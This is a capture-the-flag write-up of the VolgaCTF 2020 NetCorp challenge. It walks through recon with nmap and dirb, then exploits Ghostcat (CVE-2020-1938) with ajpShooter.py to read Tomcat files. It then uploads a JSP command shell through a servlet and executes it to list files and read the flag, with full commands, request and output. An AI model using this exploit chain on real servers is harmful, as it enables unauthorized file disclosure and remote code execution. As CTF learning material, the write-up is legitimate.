### Challenge
```
NetCorp
Another telecom provider. Hope these guys prepared well enough for the network load...

netcorp.q.2020.volgactf.ru
```

### Recon

* Nmap scan
```
kali@kali:~$ nmap -A netcorp.q.2020.volgactf.ru -p 7782
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-29 03:58 EDT
Nmap scan report for netcorp.q.2020.volgactf.ru (77.244.215.184)
Host is up (0.22s latency).
rDNS record for 77.244.215.184: bahilovopt.ru

PORT     STATE SERVICE VERSION
7782/tcp open  unknown
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"2684-1585244622000"
|     Last-Modified: Thu, 26 Mar 2020 17:43:42 GMT
|     Content-Type: text/html
|     Content-Length: 2684
|     Date: Sun, 29 Mar 2020 08:03:02 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <meta name="keywords" content="" />
|     <meta name="description" content="" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <title>NetCorp</title>
|     <link href='http://fonts.googleapis.com/css?family=Oswald:400,300' rel='stylesheet' type='text/css' />
|     <link href='http://fonts.googleapis.com/css?family=Abel|Satisfy' rel='stylesheet' type='text/css' />
|     <link href="/resources/css/default.css" rel="stylesheet" type="text/css" media="all" />
|     <!--[if IE 6]>
|     <link hre
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: OPTIONS, GET, HEAD, POST
|     Content-Length: 0
|     Date: Sun, 29 Mar 2020 08:03:02 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 505 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 2173
|     Date: Sun, 29 Mar 2020 08:03:03 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
|_    HTTP Version Not Supported</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port7782-TCP:V=7.80%I=7%D=3/29%Time=5E80553D%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,B56,"HTTP/1\.1\x20200\x20\r\nAccept-Ranges:\x20bytes\r\nETag:\
SF:x20W/\"2684-1585244622000\"\r\nLast-Modified:\x20Thu,\x2026\x20Mar\x202
SF:020\x2017:43:42\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Length:
SF:\x202684\r\nDate:\x20Sun,\x2029\x20Mar\x202020\x2008:03:02\x20GMT\r\nCo
SF:nnection:\x20close\r\n\r\n<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\
SF:x20XHTML\x201\.0\x20Strict//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD
SF:/xhtml1-strict\.dtd\">\n\n<html\x20xmlns=\"http://www\.w3\.org/1999/xht
SF:ml\">\n<head>\n\x20\x20\x20\x20<meta\x20name=\"keywords\"\x20content=\"
SF:\"\x20/>\n\x20\x20\x20\x20<meta\x20name=\"description\"\x20content=\"\"
SF:\x20/>\n\x20\x20\x20\x20<meta\x20http-equiv=\"content-type\"\x20content
SF:=\"text/html;\x20charset=utf-8\"\x20/>\n\x20\x20\x20\x20<title>NetCorp<
SF:/title>\n\x20\x20\x20\x20<link\x20href='http://fonts\.googleapis\.com/c
SF:ss\?family=Oswald:400,300'\x20rel='stylesheet'\x20type='text/css'\x20/>
SF:\n\x20\x20\x20\x20<link\x20href='http://fonts\.googleapis\.com/css\?fam
SF:ily=Abel\|Satisfy'\x20rel='stylesheet'\x20type='text/css'\x20/>\n\x20\x
SF:20\x20\x20<link\x20href=\"/resources/css/default\.css\"\x20rel=\"styles
SF:heet\"\x20type=\"text/css\"\x20media=\"all\"\x20/>\n\x20\x20\x20\x20<!-
SF:-\[if\x20IE\x206\]>\n\x20\x20\x20\x20<link\x20hre")%r(HTTPOptions,7D,"H
SF:TTP/1\.1\x20200\x20\r\nAllow:\x20OPTIONS,\x20GET,\x20HEAD,\x20POST\r\nC
SF:ontent-Length:\x200\r\nDate:\x20Sun,\x2029\x20Mar\x202020\x2008:03:02\x
SF:20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,906,"HTTP/1\.1\x2
SF:0505\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Languag
SF:e:\x20en\r\nContent-Length:\x202173\r\nDate:\x20Sun,\x2029\x20Mar\x2020
SF:20\x2008:03:03\x20GMT\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><he
SF:ad><title>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\x20Version\x20N
SF:ot\x20Supported</title><style\x20type=\"text/css\">h1\x20{font-family:T
SF:ahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:2
SF:2px;}\x20h2\x20{font-family:Tahoma,Arial,sans-serif;color:white;backgro
SF:und-color:#525D76;font-size:16px;}\x20h3\x20{font-family:Tahoma,Arial,s
SF:ans-serif;color:white;background-color:#525D76;font-size:14px;}\x20body
SF:\x20{font-family:Tahoma,Arial,sans-serif;color:black;background-color:w
SF:hite;}\x20b\x20{font-family:Tahoma,Arial,sans-serif;color:white;backgro
SF:und-color:#525D76;}\x20p\x20{font-family:Tahoma,Arial,sans-serif;backgr
SF:ound:white;color:black;font-size:12px;}\x20a\x20{color:black;}\x20a\.na
SF:me\x20{color:black;}\x20\.line\x20{height:1px;background-color:#525D76;
SF:border:none;}</style></head><body><h");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.21 seconds
kali@kali:~$ 

```

* Another full server scan
```
kali@kali:~$ sudo nmap -A -sS netcorp.q.2020.volgactf.ru
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-29 22:38 EDT
Nmap scan report for netcorp.q.2020.volgactf.ru (77.244.215.184)
Host is up (0.18s latency).
rDNS record for 77.244.215.184: bahilovopt.ru
Not shown: 994 closed ports
PORT     STATE    SERVICE      VERSION
22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c1:92:dc:3d:49:a9:8e:75:37:3a:3f:c9:2c:70:31:68 (RSA)
|   256 a0:cc:d7:85:f8:d9:ef:91:2e:61:5b:e7:75:a2:00:bd (ECDSA)
|_  256 fb:f8:2c:3f:45:3e:ff:33:62:69:cc:f8:e8:93:49:47 (ED25519)
135/tcp  filtered msrpc
139/tcp  filtered netbios-ssn
445/tcp  filtered microsoft-ds
8009/tcp open     ajp13        Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: OPTIONS GET HEAD POST
9090/tcp open     http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Aggressive OS guesses: Linux 2.6.32 - 3.13 (96%), Linux 2.6.22 - 2.6.36 (95%), Linux 3.10 - 4.11 (95%), Linux 2.6.32 (94%), Linux 3.2 - 4.9 (94%), Linux 3.10 (94%), Linux 2.6.32 - 3.10 (93%), HP P2000 G3 NAS device (93%), Linux 2.6.18 (93%), Linux 3.16 - 4.6 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 16 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   1.53 ms   192.168.0.1
2   2.07 ms   104.192.204.1
3   2.78 ms   te-4.er1.sea180.atlasonnet.com (66.171.189.161)
4   3.36 ms   xe-0-0-19-1.a00.sttlwa01.us.bb.gin.ntt.net (129.250.197.133)
5   147.90 ms ae-14.r05.sttlwa01.us.bb.gin.ntt.net (129.250.5.133)
6   ...
7   64.29 ms  ae-11.r20.nwrknj03.us.bb.gin.ntt.net (129.250.6.176)
8   61.90 ms  ae-0.r21.nwrknj03.us.bb.gin.ntt.net (129.250.6.17)
9   142.89 ms ae-17.r20.frnkge13.de.bb.gin.ntt.net (129.250.6.55)
10  142.68 ms ae-8.r01.frnkge07.de.bb.gin.ntt.net (129.250.4.79)
11  147.08 ms ae-2.a00.frnkge07.de.bb.gin.ntt.net (129.250.4.237)
12  145.20 ms trans-telecom-0.a00.frnkge07.de.bb.gin.ntt.net (213.198.82.158)
13  ...
14  194.23 ms selectel-gw.transtelecom.net (188.43.11.1)
15  184.31 ms 92.53.94.38
16  192.38 ms bahilovopt.ru (77.244.215.184)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.02 seconds
kali@kali:~$ 

```

* Dir Buster
```
(!) FATAL: Too many errors connecting to host
    (Possible cause: COULDNT RESOLVE HOST)
                                                                               
-----------------
END_TIME: Sun Mar 29 03:46:01 2020
DOWNLOADED: 0 - FOUND: 0
(env) kali@kali:~/Downloads/ubuntu$ dirb http://netcorp.q.2020.volgactf.ru:7782/

-----------------
DIRB v2.22    
By The Dark Raver 
-----------------

START_TIME: Sun Mar 29 03:46:08 2020
URL_BASE: http://netcorp.q.2020.volgactf.ru:7782/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://netcorp.q.2020.volgactf.ru:7782/ ----
+ http://netcorp.q.2020.volgactf.ru:7782/docs (CODE:302|SIZE:0)                                                                                                                                                                          
+ http://netcorp.q.2020.volgactf.ru:7782/examples (CODE:302|SIZE:0)                                                                                                                                                                      
+ http://netcorp.q.2020.volgactf.ru:7782/index.html (CODE:200|SIZE:2684)                                                                                                                                                                 
+ http://netcorp.q.2020.volgactf.ru:7782/resources (CODE:302|SIZE:0)                                                                                                                                                                     
+ http://netcorp.q.2020.volgactf.ru:7782/uploads (CODE:302|SIZE:0)                                                                                                                                                                       
                                                                                                                                                                                                                                         
-----------------
END_TIME: Sun Mar 29 04:06:01 2020
DOWNLOADED: 4612 - FOUND: 5
(env) kali@kali:~/Downloads/ubuntu$ 

```

### Solve

* So its Apache Tomcat Server --> Next, Digging into the directories and then finding out vulnerabilities in the version of apache
* the `examples` folder is interesting. It has options to execure JSP scripts and websocket. Maybe we could use the upload functionality to upload a script to example and perform RCE?
  - complaint, upload and some other pages/dirs found return a 404 ( some verification or they dont exist? )
* Taking a detour to look at vulnerabilities in this version of apache tomcat. Google for apache tomcat vulns leads to the most trending Ghostcat!
  - Ghostcat - https://blog.trendmicro.com/trendlabs-security-intelligence/busting-ghostcat-an-analysis-of-the-apache-tomcat-vulnerability-cve-2020-1938-and-cnvd-2020-10487/
  - https://threatpost.com/apache-tomcat-exploit-stealing-files/154055/
  - VulnHub has this https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2020-1938 --> Looking to exploit this.... perfectly fits the thought we had before.
  
* Ghostcat test ( First! read about the vulnerability .... )
  - `FLOW:` Leads to LFI --> Upload Exploit ( Server should allow upload or allow content control ) --> RCE [ seems to be evident from the subdir upload/ ? ]
  - `IS:` OSS Java Servlet Container
  - `WHERE:` (AJP) Apache JServ Protocol -->  web_server <==TCP (proxy)==> servlet container. 
  - `SEARCH:` AJP exploit ghost cat search returns some promising ones --> https://github.com/00theway/Ghostcat-CNVD-2020-10487 and XRAY ( original research group Chaitin Tech )
```
kali@kali:~/Ghostcat-CNVD-2020-10487$ python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /WEB-INF/web.xml read

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"1000-1585246342000"
[<] Last-Modified: Thu, 26 Mar 2020 18:12:22 GMT
[<] Content-Type: application/xml
[<] Content-Length: 1000

<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >

<web-app>
  <display-name>NetCorp</display-name>
  
  
  <servlet>
        <servlet-name>ServeScreenshot</servlet-name>
        <display-name>ServeScreenshot</display-name>
        <servlet-class>ru.volgactf.netcorp.ServeScreenshotServlet</servlet-class>
  </servlet>
  
  <servlet-mapping>
        <servlet-name>ServeScreenshot</servlet-name>
        <url-pattern>/ServeScreenshot</url-pattern>
  </servlet-mapping>


        <servlet>
                <servlet-name>ServeComplaint</servlet-name>
                <display-name>ServeComplaint</display-name>
                <description>Complaint info</description>
                <servlet-class>ru.volgactf.netcorp.ServeComplaintServlet</servlet-class>
        </servlet>

        <servlet-mapping>
                <servlet-name>ServeComplaint</servlet-name>
                <url-pattern>/ServeComplaint</url-pattern>
        </servlet-mapping>

        <error-page>
                <error-code>404</error-code>
                <location>/404.html</location>
        </error-page>

  
  
</web-app>
kali@kali:~/Ghostcat-CNVD-2020-10487$ 
```
  - XRAY
```
[INFO] 2020-03-29 22:48:47 -0400 [reverse:http_server.go:171] starting reverse http server
[INFO] 2020-03-29 22:48:47 -0400 [default:webscan.go:336] reverse http server, listen: 127.0.0.1, base url: http://127.0.0.1:40025, token: 06f2gp
[INFO] 2020-03-29 22:48:47 -0400 [default:single.go:76] set plugins parallel to 10
[INFO] 2020-03-29 22:48:48 -0400 [default:single.go:239] processing Flow: GET http://netcorp.q.2020.volgactf.ru:7782/
[INFO] 2020-03-29 22:48:49 -0400 [default:single.go:344] wait for task done
[Vuln: dirscan]
Target           "http://netcorp.q.2020.volgactf.ru:7782/"                                                                                                                                                                                
VulnType        "debug"                                                                                                                                                                                                                  
url                  "http://netcorp.q.2020.volgactf.ru:7782/examples/"                                                                                                                                                                       
filename         "/examples/"                                                                                                                                                                                                             
                                                                                                                                                                                                                                          
[Vuln: dirscan]
Target           "http://netcorp.q.2020.volgactf.ru:7782/"                                                                                                                                                                                
VulnType       "debug"                                                                                                                                                                                                                  
url                  "http://netcorp.q.2020.volgactf.ru:7782/examples/servlets/servlet/SessionExample"                                                                                                                                        
filename        "/examples/servlets/servlet/SessionExample"                                                                                                                                    
                                                              
```

* Both these confirm and align to connect the dots of what we had already found before using dirbuster. As per the read on Ghostcat we now need to find some way to upload an exploit to the web server. 
* Investigating `examples/jsp/` to find some weird scripts. Nothing looks interesting...
  - I basically stopped here and never visited this challenge back until the ctf end. I got a promising lead after more digging and refering to a nice writeup of the solution from https://github.com/r00tstici/writeups/tree/master/VolgaCTF_2020/netcorp

...
...

* Looking back at the output we have. And realizing `web.xml` at http://wiki.metawerx.net/wiki/Web.xml and http://java.boot.by/wcd-guide/ch02.html. The `web.xml` lays out 2 new functionality or app.
* We now know to construct class paths, 
```
kali@kali:~/Ghostcat-CNVD-2020-10487$ python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /WEB-INF/classes/ru/volgactf/netcorp/ServeScreenshotServlet.class -o ServeScreenshotServlet

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    
usage: ajpShooter.py [-h] [--ajp-ip AJP_IP] [-H HEADER]
                     [-X {GET,POST,HEAD,OPTIONS,PROPFIND}] [-d DATA]
                     [-o OUT_FILE] [--debug]
                     url ajp_port target_file {read,eval}
ajpShooter.py: error: the following arguments are required: shooter
kali@kali:~/Ghostcat-CNVD-2020-10487$ python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /WEB-INF/classes/ru/volgactf/netcorp/ServeScreenshotServlet.class read -o ServeScreenshotServlet

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    
[*] store response in ServeScreenshotServlet

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"4926-1585246402000"
[<] Last-Modified: Thu, 26 Mar 2020 18:13:22 GMT
[<] Content-Type: application/java
[<] Content-Length: 4926

kali@kali:~/Ghostcat-CNVD-2020-10487$ 
```

* Decompiling Java ByteCode - Using easy online way `javadecompilers.com` and `http://java-decompiler.github.io/`

 - File ServeComplaintServlet seems to have nothing
```
kali@kali:~/Ghostcat-CNVD-2020-10487$ cat decompile.java 
// 
// Decompiled by Procyon v0.5.36
// 

package ru.volgactf.netcorp;

import java.io.IOException;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.ServletException;
import javax.servlet.ServletConfig;
import javax.servlet.annotation.MultipartConfig;
import javax.servlet.http.HttpServlet;

@MultipartConfig
public class ServeComplaintServlet extends HttpServlet
{
    private static final long serialVersionUID = 1L;
    private static final String SAVE_DIR = "uploads";
    
    public ServeComplaintServlet() {
        System.out.println("ServeScreenshotServlet Constructor called!");
    }
    
    public void init(final ServletConfig config) throws ServletException {
        System.out.println("ServeScreenshotServlet \"Init\" method called");
    }
    
    public void destroy() {
        System.out.println("ServeScreenshotServlet \"Destroy\" method called");
    }
    
    protected void doGet(final HttpServletRequest request, final HttpServletResponse response) throws ServletException, IOException {
    }
    
    protected void doPost(final HttpServletRequest request, final HttpServletResponse response) throws ServletException, IOException {
    }
}

```

- ServeScreenshotServlet has `UPLOADS`
```
import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.annotation.MultipartConfig;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.Part;
import ru.volgactf.netcorp.ServeScreenshotServlet;

@MultipartConfig
public class ServeScreenshotServlet extends HttpServlet {
  private static final String SAVE_DIR = "uploads";
  
  public ServeScreenshotServlet() {
    System.out.println("ServeScreenshotServlet Constructor called!");
  }
  
  public void init(ServletConfig config) throws ServletException {
    System.out.println("ServeScreenshotServlet \"Init\" method called");
  }
  
  public void destroy() {
    System.out.println("ServeScreenshotServlet \"Destroy\" method called");
  }
  
  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String appPath = request.getServletContext().getRealPath("");
    String savePath = appPath + "uploads";
    File fileSaveDir = new File(savePath);
    if (!fileSaveDir.exists())
      fileSaveDir.mkdir(); 
    String submut = request.getParameter("submit");
    if (submut == null || !submut.equals("true"));
    for (Part part : request.getParts()) {
      String fileName = extractFileName(part);
      fileName = (new File(fileName)).getName();
      String hashedFileName = generateFileName(fileName);
      String path = savePath + File.separator + hashedFileName;
      if (path.equals("Error"))
        continue; 
      part.write(path);
    } 
    PrintWriter out = response.getWriter();
    response.setContentType("application/json");
    response.setCharacterEncoding("UTF-8");
    out.print(String.format("{'success':'%s'}", new Object[] { "true" }));
    out.flush();
  }
  
  private String generateFileName(String fileName) {
    try {
      MessageDigest md = MessageDigest.getInstance("MD5");
      md.update(fileName.getBytes());
      byte[] digest = md.digest();
      String s2 = (new BigInteger(1, digest)).toString(16);
      StringBuilder sb = new StringBuilder(32);
      for (int i = 0, count = 32 - s2.length(); i < count; i++)
        sb.append("0"); 
      return sb.append(s2).toString();
    } catch (NoSuchAlgorithmException e) {
      e.printStackTrace();
      return "Error";
    } 
  }
  
  private String extractFileName(Part part) {
    String contentDisp = part.getHeader("content-disposition");
    String[] items = contentDisp.split(";");
    for (String s : items) {
      if (s.trim().startsWith("filename"))
        return s.substring(s.indexOf("=") + 2, s.length() - 1); 
    } 
    return "";
  }
}
```

* Per the reverse construct a post request and try uploading the file.. You get success true. As per the code the md5 hash is stored in uploads as filename
* test exploit upload
```
POST /ServeScreenshot HTTP/1.1
Host: netcorp.q.2020.volgactf.ru:7782
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------19620058449989999661934895489
Content-Length: 238
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------19620058449989999661934895489
Content-Disposition: form-data; name="filename"; filename="exploit123.txt"
Content-Type: plain/text

HelloWorld
-----------------------------19620058449989999661934895489--

```

* MD5 has of the test exploit
```
kali@kali:/opt/jd-gui$ python -c "import hashlib;print(hashlib.md5('exploit123.txt').hexdigest())"
0256c781e946a65069d801c19aee37c5
```
* READ can be done with 
```
kali@kali:~/Ghostcat-CNVD-2020-10487$ python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /uploads/0256c781e946a65069d801c19aee37c5 read

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"10-1585546292858"
[<] Last-Modified: Mon, 30 Mar 2020 05:31:32 GMT
[<] Content-Length: 10

HelloWorldkali@kali:~/Ghostcat-CNVD-2020-10487$ 

```
* Execute with 
```
kali@kali:~/Ghostcat-CNVD-2020-10487$ python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /uploads/0256c781e946a65069d801c19aee37c5 eval

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"10-1585546292858"
[<] Last-Modified: Mon, 30 Mar 2020 05:31:32 GMT
[<] Content-Length: 10

HelloWorldkali@kali:~/Ghostcat-CNVD-2020-10487$ 

```

* I am not very familiar with JSP so got shell execution script from `https://blog.netspi.com/hacking-with-jsp-shells/`

```
<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML>
<BODY>
<H3>JSP SHELL</H3>
<pre>
<%
Process p;
p = Runtime.getRuntime().exec("ls");
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
%>
</pre>
</BODY>
</HTML>
```

* Execute
```
kali@kali:~/Ghostcat-CNVD-2020-10487$ python -c "import hashlib;print(hashlib.md5('exploit123.jsp').hexdigest())"
396339743bb03f30b4de085f89e3b004
kali@kali:~/Ghostcat-CNVD-2020-10487$ python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /uploads/396339743bb03f30b4de085f89e3b004 read

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"408-1585547589124"
[<] Last-Modified: Mon, 30 Mar 2020 05:53:09 GMT
[<] Content-Length: 408

<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML>
<BODY>
<H3>JSP SHELL</H3>
<pre>
<%
Process p;
p = Runtime.getRuntime().exec("ls");
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
%>
</pre>
</BODY>
</HTML>
kali@kali:~/Ghostcat-CNVD-2020-10487$ python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /uploads/396339743bb03f30b4de085f89e3b004 eval

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Set-Cookie: JSESSIONID=4EF34E88AD1DABA53A2078CDF86B6381; Path=/; HttpOnly
[<] Content-Type: text/html;charset=ISO-8859-1
[<] Content-Length: 626



<HTML>
<BODY>
<H3>JSP SHELL</H3>
<pre>
17pekog1
17pekog1.1
17pekog1.2
17pekog1.3
17pekog1.4
BUILDING.txt
CONTRIBUTING.md
LICENSE
NOTICE
README.md
RELEASE-NOTES
RUNNING.txt
Runner34496.jar
bin
cmd.jsp
conf
curl
delta.jsp
delta.jsp.1
flag.txt
index.html
index.html.1
index.html.10
index.html.11
index.html.12
index.html.13
index.html.14
index.html.15
index.html.16
index.html.17
index.html.18
index.html.2
index.html.3
index.html.4
index.html.5
index.html.6
index.html.7
index.html.8
index.html.9
lib
lll
logs
temp
uipnopui
uipnopui.1
uipnopui.2
uipnopui.3
uipnopui.4
uipnopui.5
webapps
work

</pre>
</BODY>
</HTML>
kali@kali:~/Ghostcat-CNVD-2020-10487$ 
```

* Read FLAG
```
kali@kali:~/Ghostcat-CNVD-2020-10487$ python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /uploads/396339743bb03f30b4de085f89e3b004 read

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"418-1585547665921"
[<] Last-Modified: Mon, 30 Mar 2020 05:54:25 GMT
[<] Content-Length: 418

<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML>
<BODY>
<H3>JSP SHELL</H3>
<pre>
<%
Process p;
p = Runtime.getRuntime().exec("cat flag.txt");
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
%>
</pre>
</BODY>
</HTML>
kali@kali:~/Ghostcat-CNVD-2020-10487$ python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /uploads/396339743bb03f30b4de085f89e3b004 eval

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Set-Cookie: JSESSIONID=B132DB271180EFDB7F8ACDF6BB2E0DB5; Path=/; HttpOnly
[<] Content-Type: text/html;charset=ISO-8859-1
[<] Content-Length: 150



<HTML>
<BODY>
<H3>JSP SHELL</H3>
<pre>
VolgaCTF{qualification_unites_and_real_awesome_nothing_though_i_need_else}

</pre>
</BODY>
</HTML>
kali@kali:~/Ghostcat-CNVD-2020-10487$ 

```
